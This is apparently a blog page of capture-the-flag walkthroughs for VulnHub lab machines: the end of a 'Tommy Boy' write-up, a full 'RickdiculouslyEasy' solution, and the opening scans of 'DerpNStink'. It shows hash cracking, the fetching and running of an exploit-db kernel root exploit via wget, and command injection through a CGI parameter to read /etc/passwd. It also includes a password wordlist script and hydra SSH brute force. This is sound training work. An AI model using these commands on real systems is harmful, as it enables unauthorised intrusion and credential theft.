<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc 192.168.179.149 6565 <span class="o">&gt;</span> wpdump.sql
</code></pre></div></div>

<p>I filtered the password hashes to the file wphashes.txt, then I cracked these with hashcat and I got the password <strong>tomtom1</strong>, this belongs to tom user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'wp_users'</span> wpdump.sql | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\$P\$[^,]*'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"'"</span> <span class="nt">-f</span> 1 <span class="o">&gt;</span> wphashes.txt
root@kali:~<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 400 wphashes.txt rockyou.txt
...
<span class="nv">$P$BmXAz</span>/a8CaPZDNTraFb/g6kZeTpijK.:tomtom1

root@kali:~<span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'$P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK.'</span> wpdump.sql
</code></pre></div></div>

<p>I logged in the wordpress page and had successful access.</p>

<p><img src="/assets/images/tommyboy/screenshot-27.png" alt="" /></p>

<p><img src="/assets/images/tommyboy/screenshot-28.png" alt="" /></p>

<p>I clicked on the link under Drafts and it redirected me to the site where the final part of the password was located.</p>

<p><img src="/assets/images/tommyboy/screenshot-29.png" alt="" /></p>

<h3 id="access-via-ssh">Access via SSH</h3>
<p>I logged in via SSH with the credentials:</p>

<p><strong>username:</strong> bigtommysenior</p>

<p><strong>password:</strong> fatguyinalittlecoat1938!!</p>

<p>In the home directory we can see the fourth flag, the backup to restore and the loot.zip file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh bigtommysenior@192.168.179.149
bigtommysenior@192.168.179.149<span class="s1">'s password: 
bigtommysenior@CallahanAutoSrv01:~$ id 
uid=1002(bigtommysenior) gid=1002(bigtommysenior) groups=1002(bigtommysenior)
bigtommysenior@CallahanAutoSrv01:~$ ls 
callahanbak.bak  el-flag-numero-quatro.txt  LOOT.ZIP
bigtommysenior@CallahanAutoSrv01:~$ cat el-flag-numero-quatro.txt 
YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
working status.

Flag data: EditButton

But...but...where'</span>s flag 5?  

I<span class="s1">'ll make it easy on you.  It'</span>s <span class="k">in </span>the root of this server at /5.txt
</code></pre></div></div>

<p>I restored the callahanbak.bak file on the server, we can check that’s all correct.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span><span class="nb">cp </span>callahanbak.bak /var/www/html/index.html
</code></pre></div></div>
<p><img src="/assets/images/tommyboy/screenshot-30.png" alt="" /></p>

<p>To complete our objective I unzipped the LOOT.ZIP file with the following password that is the concatenation of the five flags.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flag1: B34rcl4ws
Flag2: Z4l1nsky
Flag3: TinyHead
Flag4: EditButton
Flag5: Buttcrack
B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>unzip LOOT.ZIP 
Archive:  LOOT.ZIP
<span class="o">[</span>LOOT.ZIP] THE-END.txt password: 
  inflating: THE-END.txt             
bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span><span class="nb">cat </span>THE-END.txt 
YOU CAME.
YOU SAW.
YOU PWNED.

Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.

GREAT WORK!

I<span class="s1">'d love to know that you finished this VM, and/or get your suggestions on how to make the next 
one better.

Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"

Or, get in touch with me other ways:

* Twitter: @7MinSec
* IRC (Freenode): #vulnhub (username is braimee)

Lastly, please don'</span>t forget to check out www.7ms.us and subscribe to the podcast at
bit.ly/7minsec

&lt;/shamelessplugs&gt;

Thanks and have a blessed week!

<span class="nt">-Brian</span> Johnson
7 Minute Security
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="kernel-exploitation">Kernel Exploitation</h3>

<p>We can’t finish our mission without get root, the kernel version for this system allows for arbitrary read/write access to the linux kernel, bypassing SMEP/SMAP, you can download the exploit <a href="https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/linux/local/45010.c">here</a>.</p>

<p>I started a web server with php on my local machine on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>php <span class="nt">-S</span> 192.168.179.1:80 
</code></pre></div></div>

<p>Then I transferred the exploit to the target machine, compiled it and ran it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bigtommysenior@CallahanAutoSrv01:/tmp<span class="nv">$ </span>wget 192.168.179.1/45010.c <span class="nt">-O</span> r00t.c

bigtommysenior@CallahanAutoSrv01:/tmp<span class="nv">$ </span>./r00t 
<span class="o">[</span>.] 
<span class="o">[</span>.] t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span> exploit <span class="k">for </span>counterfeit grsec kernels such as KSPP and linux-hardened t<span class="o">(</span><span class="nt">-_-t</span><span class="o">)</span>
<span class="o">[</span>.] 
<span class="o">[</span>.]   <span class="k">**</span> This vulnerability cannot be exploited at all on authentic grsecurity kernel <span class="k">**</span>
<span class="o">[</span>.] 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating bpf map
<span class="o">[</span><span class="k">*</span><span class="o">]</span> sneaking evil bpf past the verifier
<span class="o">[</span><span class="k">*</span><span class="o">]</span> creating socketpair<span class="o">()</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> attaching bpf backdoor to socket
<span class="o">[</span><span class="k">*</span><span class="o">]</span> skbuff <span class="o">=&gt;</span> ffff880016d9b500
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking sock struct from ffff880016d38000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sock-&gt;sk_rcvtimeo at offset 472
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cred structure at ffff8800130aa780
<span class="o">[</span><span class="k">*</span><span class="o">]</span> UID from cred structure: 1002, matches the current: 1002
<span class="o">[</span><span class="k">*</span><span class="o">]</span> hammering cred structure at ffff8800130aa780
<span class="o">[</span><span class="k">*</span><span class="o">]</span> credentials patched, launching shell...
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>bigtommysenior<span class="o">)</span>
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - RickdiculouslyEasy 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>August 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> It is a very simple Rick and Morty themed boot to root, designed to be a beginner ctf.</p>

<p><strong>Author:</strong> Luke</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/">https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We start by discovering the target on the local machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1-255
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-18 19:53 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
Nmap scan report <span class="k">for </span>192.168.179.148
Host is up <span class="o">(</span>0.00074s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 08:00:27:7B:BF:F3 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00018s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:E2:97:73 <span class="o">(</span>VMware<span class="o">)</span>
Nmap <span class="k">done</span>: 255 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.01 seconds
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Found our target and then we proceed to perform a full TCP port scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-T5</span> <span class="nt">-p1-65535</span> 192.168.179.148 <span class="nt">-oG</span> tcp-all-ports.txt
...
PORT      STATE SERVICE    REASON
21/tcp    open  ftp        syn-ack ttl 64
22/tcp    open  ssh        syn-ack ttl 64
80/tcp    open  http       syn-ack ttl 64
9090/tcp  open  zeus-admin syn-ack ttl 64
13337/tcp open  unknown    syn-ack ttl 64
22222/tcp open  easyengine syn-ack ttl 64
60000/tcp open  unknown    syn-ack ttl 64
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>Then I perform the version and OS detection and script scanning for open TCP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p21</span>,22,80,9090,13337,22222,60000 192.168.179.148 <span class="nt">-oN</span> service-enum.txt
...
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| <span class="nt">-rw-r--r--</span>    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.179.1
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh?    syn-ack ttl 64
| fingerprint-strings:
|   NULL:
|_    Welcome to Ubuntu 14.04.5 LTS <span class="o">(</span>GNU/Linux 4.4.0-31-generic x86_64<span class="o">)</span>
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.27 <span class="o">((</span>Fedora<span class="o">))</span>
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 <span class="o">(</span>Fedora<span class="o">)</span>
|_http-title: Morty<span class="s1">'s Website
9090/tcp  open  http    syn-ack ttl 64 Cockpit web service 161 or earlier
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to https://192.168.179.148:9090/
13337/tcp open  unknown syn-ack ttl 64
| fingerprint-strings:
|   NULL:
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNvEvp4kqXX1H6FNqkKASBizY59uyLsqrLzLfT4R5vD8yuq+K0OqomxTiDwipMZTfQIRuBl2OzXX3rzRQ0aB+4EXyLbsxqNNP/+xRgPgFL6FPNI7j2rPGt+hQ6nmkpBJzzSpA4BBlGwvQt/i4LhrRoDsuD2JxQlmH1LNAlG6rE+xyqMTEgnfnO70pYzcmxDOixHiqTkbrsGnE6kIiyiOopwsR2E2KLPusFQJhEhsOOCJzurO7YYbDxQIwOMOox96SPtgti+4bnAVndLpo/IddtzZu3PB4SK43aIeGWgP7ONl6H0Cs1opW1EQSmdpww+Nu3fMlAlC+VMfmJNca8z9Np
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKqM0Vcrgqds3NsV5wJ7j876UEKSpMytY6gNpa0Ey47sSAizc+hUU8UGoFmPsco2rjIn9QhdEIWzeMJksnpbxDk=
|   256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHJ5AJGj4+y9xHabmQ5cLyxySqPvQ9sW+ko0w1vnzZWI
60000/tcp open  unknown syn-ack ttl 64
|_drda-info: ERROR
| fingerprint-strings:
|   NULL, ibm-db2:
|_    Welcome to Ricks half baked reverse shell...
</span></code></pre></div></div>
<p>If we notice in the results we can see an unusual banner on port 13337, the value of our first flag 10pts.</p>

<h3 id="ftp-enumeration">FTP Enumeration</h3>
<p>The anonymous login is enabled for the FTP service, so I create a mount point on my machine and we have the second flag of 10pts, for the moment we have 20pts.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">mkdir</span> /mnt/ftp
root@kali:~<span class="nv">$ </span>curlftpfs ftp://anonymous:@192.168.179.148 /mnt/ftp
root@kali:~<span class="nv">$ </span><span class="nb">cd</span> /mnt/ftp
root@kali:/mnt/ftp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> <span class="k">*</span>
<span class="nt">-rw-r--r--</span> 1 root root 42 Aug 22  2017 FLAG.txt

pub:
total 4
drwxr-xr-x 2 root root    6 Feb 12  2017 <span class="nb">.</span>
drwxr-xr-x 1 root root 1024 Dec 31  1969 ..
root@kali:/mnt/ftp<span class="nv">$ </span><span class="nb">cat </span>FLAG.txt 
FLAG<span class="o">{</span>Whoa this is unexpected<span class="o">}</span> - 10 Points
</code></pre></div></div>

<h3 id="web-enumeration-on-por-80">Web Enumeration on por 80</h3>
<p>In the web service at first glance I can’t find anything, so I request for the robots.txt file.</p>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-2.png" alt="" /></p>

<p>In the tracertool.cgi file, I found a traceroute utility, it looks interesting.</p>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-3.png" alt="" /></p>

<p>I try to add the <strong>id</strong> command after of the loopback ip address followed by a semicolon and the command is executed, apparently the user input is not validating correctly.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi?ip<span class="o">=</span>127.0.0.1<span class="p">;</span><span class="nb">id</span>
</code></pre></div></div>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-4.png" alt="" /></p>

<p>Then I try to list a path back and found the html directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi?ip<span class="o">=</span><span class="p">;</span><span class="nb">ls</span> <span class="nt">-la</span> ../
</code></pre></div></div>
<p><img src="/assets/images/rickdiculouslyeasy/screenshot-5.png" alt="" /></p>

<p>I list the html directory and I find a passwords file, access it and I found the flag.txt and passwords.html files.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi?ip<span class="o">=</span><span class="p">;</span><span class="nb">ls</span> <span class="nt">-la</span> ../html
</code></pre></div></div>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-6.png" alt="" /></p>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-7.png" alt="" /></p>

<p>We have the third 10pts flag that adds up to 30pts.</p>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-8.png" alt="" /></p>

<p>In the passwords.html file I found the <strong>winter</strong> password.</p>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-9.png" alt="" /></p>

<p>Now we have the password but don’t know the system users to access via ssh, trying to display the content of the passwd file with the cat command, this doesn’t work to avoid this problem I used the less command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.148/cgi-bin/tracertool.cgi?ip<span class="o">=</span><span class="p">;</span>less /etc/passwd
</code></pre></div></div>
<p><img src="/assets/images/rickdiculouslyeasy/screenshot-10.png" alt="" /></p>

<h3 id="enumeration-on-port-60000">Enumeration on port 60000</h3>
<p>On this port we connect with netcat, but this is a rabbit hole, the only one I could find is the 10pts flag that adds up to 40pts.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc 192.168.179.148 60000
Welcome to Ricks half baked reverse shell...
<span class="c"># whoami</span>
root 
<span class="c"># id</span>
<span class="nb">id</span>: <span class="nb">command </span>not found 
<span class="c"># ls</span>
FLAG.txt 
<span class="c"># pwd </span>
/root/blackhole/ 
<span class="c"># cd ..</span>
Permission Denied. 
<span class="c"># cd /tmp</span>
Permission Denied. 
<span class="c"># cat FLAG.txt</span>
FLAG<span class="o">{</span>Flip the pickle Morty!<span class="o">}</span> - 10 Points 
<span class="c"># </span>
</code></pre></div></div>

<h3 id="enumeration-on-port-9090">Enumeration on port 9090</h3>
<p>On this port I found another 10pts flag that adds up to 50pts.</p>

<p><img src="/assets/images/rickdiculouslyeasy/screenshot-11.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>
<p>I logged via ssh with the user <strong>Summer</strong> and password <strong>winter</strong>, and in her home directory I found the 10pts flag, this adds up to 60pts.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh Summer@192.168.179.148 <span class="nt">-p</span> 22222
Summer@192.168.179.148<span class="s1">'s password: 
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
[Summer@localhost ~]$ id
uid=1002(Summer) gid=1002(Summer) groups=1002(Summer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[Summer@localhost ~]$ ls
FLAG.txt
[Summer@localhost ~]$ less FLAG.txt 
FLAG{Get off the high road Summer!} - 10 Points
</span></code></pre></div></div>

<p>In the Morty’s home directory I found an image and a zip file, downloaded via scp.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>scp <span class="nt">-P</span> 22222 Summer@192.168.179.148:<span class="s2">"/home/Morty/{journal.txt.zip,Safe_Password.jpg}"</span> <span class="nb">.</span>
Summer@192.168.179.148<span class="s1">'s password: 
journal.txt.zip                                                                           100%  414    29.4KB/s   00:00
Safe_Password.jpg                                                                         100%   42KB   1.1MB/s   00:00
</span></code></pre></div></div>

<p>Analyzing the image with the strings command I found the <strong>Meeseek</strong> password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>strings Safe_Password.jpg | <span class="nb">head</span> <span class="nt">-5</span>
JFIF
Exif
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
8BIM
8BIM
</code></pre></div></div>

<p>Then I unzip the <strong>journal.txt.zip</strong> file with the password found, in the text we see something about a password for safe, and the 20pts flag, this adds up to 80pts.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>unzip journal.txt.zip              
Archive:  journal.txt.zip
<span class="o">[</span>journal.txt.zip] journal.txt password: 
  inflating: journal.txt
  root@kali:~<span class="nv">$ </span><span class="nb">cat </span>journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: <span class="o">{</span>131333<span class="o">}</span> - 20 Points
</code></pre></div></div>

<p>Inside the path <strong>/home/RickSanchez/RickSanchez/RICKS_SAFE/</strong>, I found a binary called safe.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Summer@localhost home]<span class="nv">$ </span><span class="nb">cd </span>RickSanchez/RickSanchez/RICKS_SAFE/
<span class="o">[</span>Summer@localhost RICKS_SAFE]<span class="nv">$ </span><span class="nb">ls
</span>safe
</code></pre></div></div>

<p>I transfer this to the attacking machine, I give execution permissions to the safe binary, and to execute it assign the password <strong>131333</strong> as parameter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Summer@localhost RICKS_SAFE]<span class="nv">$ </span>nc <span class="nt">-vln</span> 3232 &lt; safe 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc 192.168.179.148 3232 <span class="o">&gt;</span> safe
root@kali:~<span class="nv">$ </span><span class="nb">chmod </span>755 safe
root@kali:~<span class="nv">$ </span>./safe 131333
decrypt:        FLAG<span class="o">{</span>And Awwwaaaaayyyy we Go!<span class="o">}</span> - 20 Points

Ricks password hints:
 <span class="o">(</span>This is incase I forget.. I just hope I don<span class="s1">'t forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.  @
</span></code></pre></div></div>
<p>In the results we can see the 20pts flag that adds up to 100pts, and the specifications to generate the password for the Rick user, searching in google I found the band <strong><a href="https://rickandmorty.fandom.com/wiki/The_Flesh_Curtains">The Flesh Curtains</a></strong> to wich Rick belonged, I developed a simple bash script to generate the possible passwords, and execute it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nv">band</span><span class="o">=</span><span class="s1">'The Flesh Curtains'</span>

<span class="k">for </span>l <span class="k">in</span> <span class="o">{</span>A..Z<span class="o">}</span><span class="p">;</span> <span class="k">do
        for </span>n <span class="k">in</span> <span class="o">{</span>0..9<span class="o">}</span><span class="p">;</span> <span class="k">do
           for </span>w <span class="k">in</span> <span class="nv">$band</span><span class="p">;</span> <span class="k">do
                   </span><span class="nb">echo</span> <span class="nv">$l$n$w</span>
           <span class="k">done
        done
done</span> <span class="o">&gt;</span> wordlist.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>./dictgen.sh 
</code></pre></div></div>

<p>Then I ran hydra to perform brute force with the generated wordlist.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-l</span> RickSanchez <span class="nt">-P</span> wordlist.txt ssh://192.168.179.148:22222
..
<span class="o">[</span>22222][ssh] host: 192.168.179.148   login: RickSanchez   password: P7Curtains
</code></pre></div></div>

<p>Now we have the RickSanchez password and I loggin via ssh.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> RickSanchez 192.168.179.148 <span class="nt">-p</span> 22222
RickSanchez@192.168.179.148<span class="s1">'s password:
[RickSanchez@localhost ~]$ id
uid=1000(RickSanchez) gid=1000(RickSanchez) groups=1000(RickSanchez),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-rights">Sudo Rights</h3>
<p>Checking the sudo permissions this user is allowed to execute any command with those rights, so I execute the following instruction and we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>RickSanchez@localhost ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>RickSanchez: 
Matching Defaults entries <span class="k">for </span>RickSanchez on localhost:
    <span class="o">!</span>visiblepw, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>,
    env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME
    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>, <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin

User RickSanchez may run the following commands on localhost:
    <span class="o">(</span>ALL<span class="o">)</span> ALL
<span class="o">[</span>RickSanchez@localhost ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-s</span>
<span class="o">[</span>root@localhost RickSanchez]# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
<span class="o">[</span>root@localhost RickSanchez]# <span class="nb">cd</span>
<span class="o">[</span>root@localhost ~]# <span class="nb">ls
</span>anaconda-ks.cfg  FLAG.txt
<span class="o">[</span>root@localhost ~]# CATONALEASH FLAG.txt 
FLAG: <span class="o">{</span>Ionic Defibrillator<span class="o">}</span> - 30 points
</code></pre></div></div>
<p>In the /root directory I found the last 30pts flag that adds up to 130pts completing our goal.</p>


  
    <h1 class="post-title">VulnHub - DerpNStink 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>August 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live.</p>

<p><strong>Author:</strong> Bryan Smith</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To find all 4 flags eventually leading you to full root access.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/derpnstink-1,221/">https://www.vulnhub.com/entry/derpnstink-1,221/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We start to dicover our target machine with arp-scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.147 00:0c:29:75:19:b9       VMware, Inc.
192.168.179.254 00:50:56:e6:64:bd       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Now that we have the IP address of the target machine, I proceed to perform a full TCP port scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.147 <span class="nt">-oG</span> nmap-tcp-ports.txt
...
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>With nmap I do version detection of the open ports and script scanning.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-vv</span> <span class="nt">-p21</span>,22,80 192.168.179.147 <span class="nt">-oN</span> servivce-enum.txt
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 <span class="o">(</span>DSA<span class="o">)</span>
